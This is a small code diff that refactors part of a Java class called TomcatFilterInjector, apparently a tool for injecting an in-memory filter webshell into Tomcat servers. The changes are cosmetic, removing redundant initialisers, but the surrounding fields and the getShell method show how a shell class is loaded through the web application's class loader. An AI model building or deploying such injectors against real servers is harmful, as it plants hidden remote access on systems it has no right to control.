@@ -20,7 +20,7 @@ public class TomcatFilterInjector {
     private static String urlPattern;
     private static String shellClassName;
     private static String shellClass;
-    private static boolean ok = false;
+    private static boolean ok;
 
     public TomcatFilterInjector() {
         if (ok) {
@@ -100,7 +100,7 @@ public class TomcatFilterInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
